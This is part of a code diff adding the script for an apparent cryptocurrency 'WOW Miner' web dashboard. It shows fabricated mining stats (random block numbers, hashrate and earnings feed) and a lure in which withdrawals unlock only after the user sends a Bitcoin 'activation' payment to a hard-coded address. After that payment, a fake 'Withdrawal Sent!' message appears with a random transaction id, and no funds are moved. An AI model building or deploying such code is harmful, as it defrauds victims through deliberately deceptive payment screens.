+  if (Math.random() < 1/120) {
+    blockNumber++;
+    const b = blockNumber.toLocaleString();
+    const lb1 = document.getElementById('last-block-left');
+    const lb2 = document.getElementById('last-block-right');
+    if (lb1) lb1.textContent = b;
+    if (lb2) lb2.textContent = b;
+  }
+}
+
+// ============================================================
+// UPTIME
+// ============================================================
+function updateUptime(now) {
+  const elapsed = Math.floor((now - uptimeStart) / 1000);
+  const h = Math.floor(elapsed / 3600).toString().padStart(2, '0');
+  const m = Math.floor((elapsed % 3600) / 60).toString().padStart(2, '0');
+  const s = (elapsed % 60).toString().padStart(2, '0');
+  const el = document.getElementById('uptime-display');
+  if (el) el.textContent = `${h}:${m}:${s}`;
+}
+
+// ============================================================
+// SPARKLINE
+// ============================================================
+function updateSparkline() {
+  sparkData.push(sparkHashrate);
+  if (sparkData.length > 60) sparkData.shift();
+  drawSparkline();
+}
+
+function drawSparkline() {
+  const canvas = document.getElementById('sparkline-canvas');
+  if (!canvas) return;
+  const ctx = canvas.getContext('2d');
+  const dpr = window.devicePixelRatio || 1;
+  const rect = canvas.getBoundingClientRect();
+  canvas.width = rect.width * dpr;
+  canvas.height = 36 * dpr;
+  ctx.scale(dpr, dpr);
+  const W = rect.width, H = 36;
+
+  if (sparkData.length < 2) return;
+
+  const min = Math.min(...sparkData) - 0.05;
+  const max = Math.max(...sparkData) + 0.05;
+  const range = max - min || 0.1;
+
+  const pts = sparkData.map((v, i) => ({
+    x: (i / (sparkData.length - 1)) * W,
+    y: H - ((v - min) / range) * (H - 4) - 2
+  }));
+
+  // Gradient fill
+  const grad = ctx.createLinearGradient(0, 0, 0, H);
+  grad.addColorStop(0, 'rgba(123,47,255,0.30)');
+  grad.addColorStop(1, 'rgba(123,47,255,0)');
+
+  ctx.clearRect(0, 0, W, H);
+
+  // Fill
+  ctx.beginPath();
+  ctx.moveTo(pts[0].x, H);
+  ctx.lineTo(pts[0].x, pts[0].y);
+  for (let i = 1; i < pts.length; i++) {
+    const prev = pts[i - 1];
+    const cp1x = prev.x + (pts[i].x - prev.x) / 3;
+    const cp2x = pts[i].x - (pts[i].x - prev.x) / 3;
+    ctx.bezierCurveTo(cp1x, prev.y, cp2x, pts[i].y, pts[i].x, pts[i].y);
+  }
+  ctx.lineTo(pts[pts.length - 1].x, H);
+  ctx.closePath();
+  ctx.fillStyle = grad;
+  ctx.fill();
+
+  // Stroke
+  ctx.beginPath();
+  ctx.moveTo(pts[0].x, pts[0].y);
+  for (let i = 1; i < pts.length; i++) {
+    const prev = pts[i - 1];
+    const cp1x = prev.x + (pts[i].x - prev.x) / 3;
+    const cp2x = pts[i].x - (pts[i].x - prev.x) / 3;
+    ctx.bezierCurveTo(cp1x, prev.y, cp2x, pts[i].y, pts[i].x, pts[i].y);
+  }
+  ctx.strokeStyle = COIN_COLOR_SECONDARY;
+  ctx.lineWidth = 1.5;
+  ctx.stroke();
+
+  // Tip dot
+  const last = pts[pts.length - 1];
+  ctx.beginPath();
+  ctx.arc(last.x, last.y, 3, 0, Math.PI * 2);
+  ctx.fillStyle = COIN_COLOR_SECONDARY;
+  ctx.fill();
+}
+
+// ============================================================
+// ACTIVITY FEED
+// ============================================================
+function hexStr(len) {
+  return Array.from(crypto.getRandomValues(new Uint8Array(len)))
+    .map(b => b.toString(16).padStart(2, '0')).join('').substring(0, len);
+}
+
+function addActivityEntry() {
+  const now = new Date();
+  const time = now.toTimeString().split(' ')[0];
+  const hash = hexStr(8) + '…' + hexStr(4);
+  const amount = '+' + rand(0.0003, 0.0008).toFixed(4) + ' WOW';
+
+  const entry = { time, hash, amount };
+  activityEntries.unshift(entry);
+  if (activityEntries.length > MAX_ACTIVITY) activityEntries.pop();
+
+  renderActivityFeed();
+}
+
+function renderActivityFeed() {
+  const feed = document.getElementById('activity-feed');
+  if (!feed) return;
+  feed.innerHTML = '';
+  activityEntries.forEach((e, i) => {
+    const div = document.createElement('div');
+    div.className = 'activity-entry';
+    if (i === 0) div.style.animation = 'fadeInLeft .35s ease';
+    div.innerHTML = `
+      <span class="entry-time">${e.time}</span>
+      <span class="entry-hash">${e.hash}</span>
+      <span class="entry-amount">${e.amount}</span>
+    `;
+    feed.appendChild(div);
+  });
+}
+
+// ============================================================
+// WITHDRAW BUTTON
+// ============================================================
+function updateWithdrawBtn() {
+  const btn = document.getElementById('withdraw-btn');
+  if (!btn) return;
+  if (balance >= MIN_WITHDRAW) {
+    btn.classList.add('active');
+    btn.textContent = '✈ Withdraw Now';
+    btn.disabled = false;
+
+    // Update withdrawal badge
+    const badge = document.getElementById('withdrawal-badge');
+    if (badge && isActivated) {
+      badge.className = 'badge badge-green';
+      badge.textContent = 'UNLOCKED';
+    }
+  } else {
+    btn.classList.remove('active');
+    const needed = (MIN_WITHDRAW - balance).toFixed(2);
+    btn.textContent = `🔒 Earn $${needed} more to unlock`;
+    btn.disabled = true;
+  }
+}
+
+// ============================================================
+// PRICE API
+// ============================================================
+async function fetchPrices() {
+  try {
+    const r = await fetch(
+      `https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,${COINGECKO_ID}&vs_currencies=usd&include_24hr_change=true`
+    );
+    const data = await r.json();
+
+    const btcPrice = data?.bitcoin?.usd;
+    const btcChange = data?.bitcoin?.usd_24h_change;
+    const wowPrice = data?.[COINGECKO_ID]?.usd;
+    const wowChange = data?.[COINGECKO_ID]?.usd_24h_change;
+
+    const btcEl = document.getElementById('btc-price');
+    const btcChEl = document.getElementById('btc-change');
+    if (btcEl && btcPrice) btcEl.textContent = '$' + btcPrice.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
+    if (btcChEl && btcChange != null) {
+      const sign = btcChange >= 0 ? '+' : '';
+      btcChEl.textContent = sign + btcChange.toFixed(2) + '%';
+      btcChEl.className = 'coin-change ' + (btcChange >= 0 ? 'change-pos' : 'change-neg');
+    }
+
+    const wowEl = document.getElementById('wow-price');
+    const wowChEl = document.getElementById('wow-change');
+    if (wowEl && wowPrice) {
+      wowEl.textContent = '$' + wowPrice.toFixed(6);
+    } else if (wowEl) {
+      wowEl.textContent = 'Offline';
+      wowEl.style.color = 'var(--muted)';
+    }
+    if (wowChEl && wowChange != null) {
+      const sign = wowChange >= 0 ? '+' : '';
+      wowChEl.textContent = sign + wowChange.toFixed(2) + '%';
+      wowChEl.className = 'coin-change ' + (wowChange >= 0 ? 'change-pos' : 'change-neg');
+    }
+  } catch (e) {
+    const wowEl = document.getElementById('wow-price');
+    if (wowEl) { wowEl.textContent = 'Offline'; wowEl.style.color = 'var(--muted)'; }
+  }
+}
+
+// ============================================================
+// ACTIVATION
+// ============================================================
+function activateLocally() {
+  isActivated = true;
+  localStorage.setItem(lsKey('activated'), 'true');
+
+  clearInterval(paymentPollInterval);
+  paymentPollInterval = null;
+
+  if (currentSwalInstance) {
+    currentSwalInstance.close();
+    currentSwalInstance = null;
+  }
+
+  const badge = document.getElementById('withdrawal-badge');
+  if (badge) { badge.className = 'badge badge-green'; badge.textContent = 'UNLOCKED'; }
+
+  const actCard = document.getElementById('act-card');
+  if (actCard) actCard.classList.add('revealed');
+  document.getElementById('act-locked-content').style.display = 'none';
+  document.getElementById('act-activated-content').style.display = 'block';
+
+  Swal.fire({
+    background: '#12162a',
+    color: '#e8eaf0',
+    icon: 'success',
+    iconColor: '#22c55e',
+    title: 'Payment Confirmed!',
+    text: 'Withdrawals are now permanently unlocked.',
+    confirmButtonColor: COIN_COLOR_PRIMARY,
+    timer: 5000,
+    timerProgressBar: true
+  });
+}
+
+// ============================================================
+// PAYMENT MODAL
+// ============================================================
+function copyBtcAddress() {
+  const btn = document.getElementById('copy-btn');
+  if (!btn) return;
+  const addr = BTC_ADDRESS;
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(addr).catch(() => fallbackCopy(addr));
+  } else {
+    fallbackCopy(addr);
+  }
+  btn.innerHTML = '<i class="fa-solid fa-check"></i> ✓ Copied!';
+  setTimeout(() => { btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copy address'; }, 3000);
+}
+
+function fallbackCopy(text) {
+  const ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.position = 'fixed';
+  ta.style.opacity = '0';
+  document.body.appendChild(ta);
+  ta.select();
+  document.execCommand('copy');
+  document.body.removeChild(ta);
+}
+
+function cancelPaymentModal() {
+  clearInterval(paymentPollInterval);
+  paymentPollInterval = null;
+  if (currentSwalInstance) {
+    currentSwalInstance.close();
+    currentSwalInstance = null;
+  }
+}
+
+function setBcStatus(state, text) {
+  const badge = document.getElementById('bc-status-badge');
+  if (!badge) return;
+  badge.className = 'bc-status ' + state;
+  badge.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin" style="font-size:9px"></i> ${text}`;
+}
+
+function startPaymentPolling(createdAt) {
+  clearInterval(paymentPollInterval);
+  setBcStatus('checking', 'Scanning blockchain…');
+
+  paymentPollInterval = setInterval(async () => {
+    setBcStatus('checking', 'Scanning blockchain…');
+    try {
+      const r = await fetch(`${BACKEND_URL}/api/check-payment`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ session: sessionId, createdAt })
+      });
+      const data = await r.json();
+      if (data.status === 'confirmed' || data.status === 'already_activated') {
+        clearInterval(paymentPollInterval);
+        activateLocally();
+      } else if (data.status === 'pending_confirmation') {
+        setBcStatus('pending', 'Transaction found — awaiting confirmation…');
+      } else {
+        setBcStatus('', 'No payment found yet. Checking every 15s…');
+      }
+    } catch (e) {
+      setBcStatus('', 'Backend offline — retrying…');
+    }
+  }, 15000);
+}
+
+function openPaymentModal() {
+  const tpl = document.getElementById('payment-modal-tpl');
+  const content = tpl.content.firstElementChild.cloneNode(true);
+
+  currentSwalInstance = Swal.fire({
+    background: '#12162a',
+    color: '#e8eaf0',
+    width: 400,
+    html: content,
+    title: '<i class="fa-brands fa-bitcoin" style="color:#f7931a;margin-right:6px"></i>Activate Withdrawals',
+    showConfirmButton: true,
+    showCancelButton: true,
+    confirmButtonText: 'I have Paid',
+    cancelButtonText: 'Close',
+    confirmButtonColor: COIN_COLOR_PRIMARY,
+    cancelButtonColor: 'rgba(255,255,255,0.08)',
+    allowOutsideClick: false,
+    didOpen: () => {
+      // Generate QR
+      const qrContainer = document.getElementById('qr-container');
+      if (qrContainer) {
+        new QRCode(qrContainer, {
+          text: `bitcoin:${BTC_ADDRESS}?amount=0.00145`,
+          width: 130,
+          height: 130,
+          colorDark: '#000000',
+          colorLight: '#ffffff',
+          correctLevel: QRCode.CorrectLevel.H
+        });
+      }
+    },
+    preConfirm: () => {
+      // Show loader, keep modal open
+      const loader = document.getElementById('modal-loader');
+      if (loader) loader.style.display = 'block';
+      const statusLine = document.querySelector('.status-line');
+      if (statusLine) statusLine.style.display = 'none';
+      // Hide confirm/cancel
+      const confirmBtn = document.querySelector('.swal2-confirm');
+      const cancelBtn = document.querySelector('.swal2-cancel');
+      if (confirmBtn) confirmBtn.style.display = 'none';
+      if (cancelBtn) cancelBtn.style.display = 'none';
+
+      startPaymentPolling(new Date().toISOString());
+      return false; // never auto-close
+    }
+  });
+}
+
+// ============================================================
+// WITHDRAW FLOW
+// ============================================================
+document.addEventListener('DOMContentLoaded', () => {
+  const btn = document.getElementById('withdraw-btn');
+  if (btn) {
+    btn.addEventListener('click', () => {
+      if (balance < MIN_WITHDRAW) return;
+
+      if (!isActivated) {
+        // Show activation card
+        const actCard = document.getElementById('act-card');
+        if (actCard && !actCard.classList.contains('revealed')) {
+          actCard.classList.add('revealed');
+        }
+        return;
+      }
+
+      // Activated — process withdrawal
+      const amount = parseFloat(document.getElementById('amount-input').value);
+      const address = document.getElementById('address-input').value.trim();
+
+      if (!address) {
+        Swal.fire({
+          background:'#12162a', color:'#e8eaf0',
+          icon:'warning', iconColor:COIN_COLOR_PRIMARY,
+          title:'Address Required',
+          text:'Please enter your WOW / BTC address.',
+          confirmButtonColor: COIN_COLOR_PRIMARY
+        });
+        return;
+      }
+      if (!amount || amount < 50) {
+        Swal.fire({
+          background:'#12162a', color:'#e8eaf0',
+          icon:'warning', iconColor:COIN_COLOR_PRIMARY,
+          title:'Minimum $50.00',
+          text:'Withdrawal amount must be at least $50.00.',
+          confirmButtonColor: COIN_COLOR_PRIMARY
+        });
+        return;
+      }
+      if (amount > balance) {
+        Swal.fire({
+          background:'#12162a', color:'#e8eaf0',
+          icon:'error', iconColor:'#ef4444',
+          title:'Insufficient Balance',
+          text:`Your current balance is $${balance.toFixed(2)}. You cannot withdraw more than your balance.`,
+          confirmButtonColor: COIN_COLOR_PRIMARY
+        });
+        return;
+      }
+
+      // Process
+      balance -= amount;
+      saveState();
+      const txId = Array.from(crypto.getRandomValues(new Uint8Array(8))).map(b=>b.toString(16).padStart(2,'0')).join('');
+      Swal.fire({
+        background:'#12162a', color:'#e8eaf0',
+        icon:'success', iconColor:'#22c55e',
+        title:'Withdrawal Sent!',
+        html: `<span style="color:#7b82a0;font-size:13px">
+          <strong style="color:#22c55e">$${amount.toFixed(2)}</strong> sent to your wallet.<br>
+          TX: <code style="font-size:10px;color:#e91e8c">${txId}</code><br>
+          Arrival: 5–15 min
+        </span>`,
+        confirmButtonColor: COIN_COLOR_PRIMARY,
+        timer: 6000,
+        timerProgressBar: true
+      });
+    });
+  }
+
+  const actBtn = document.getElementById('act-btn');
+  if (actBtn) {
+    actBtn.addEventListener('click', openPaymentModal);
+  }
+});
+
+// ============================================================
+// BACKEND POLLING (silent status check)
+// ============================================================
+function startBackendPoll() {
+  backendPollInterval = setInterval(async () => {
+    if (isActivated) { clearInterval(backendPollInterval); return; }
+    try {
+      const r = await fetch(`${BACKEND_URL}/api/status?session=${sessionId}`);
+      const data = await r.json();
+      if (data.activated) activateLocally();
+    } catch (e) { /* silent */ }
+  }, 8000);
+}
+
+// ============================================================
+// INIT
+// ============================================================
+function init() {
+  loadState();
+
+  // Session display
+  const sessionEl = document.getElementById('session-display');
+  if (sessionEl) sessionEl.textContent = `Session: ${sessionId.substring(0, 8)}…`;
+  console.log(`[WOW Miner] Session ID: ${sessionId}`);
+
+  // Restore activation UI
+  if (isActivated) {
+    const badge = document.getElementById('withdrawal-badge');
+    if (badge) { badge.className = 'badge badge-green'; badge.textContent = 'UNLOCKED'; }
+    const actCard = document.getElementById('act-card');
+    if (actCard) actCard.classList.add('revealed');
+    document.getElementById('act-locked-content').style.display = 'none';
+    document.getElementById('act-activated-content').style.display = 'block';
+  }
+
+  // Seed initial sparkline
+  for (let i = 0; i < 30; i++) {
+    sparkHashrate += (Math.random() - 0.5) * 0.06;
+    sparkHashrate = Math.max(2.20, Math.min(2.70, sparkHashrate));
+    sparkData.push(sparkHashrate);
+  }
+
+  // Seed initial activity
+  for (let i = 5; i >= 0; i--) {
+    const d = new Date(Date.now() - i * 1000);
+    const time = d.toTimeString().split(' ')[0];
+    activityEntries.push({
+      time,
+      hash: hexStr(8) + '…' + hexStr(4),
+      amount: '+' + rand(0.0003, 0.0008).toFixed(4) + ' WOW'
+    });
+  }
+  renderActivityFeed();
+
+  // Start loops
+  fetchPrices();
+  setInterval(fetchPrices, 60000);
+  startBackendPoll();
+
+  requestAnimationFrame(tick);
+}
+
+init();
+</script>
+</body>
+</html>
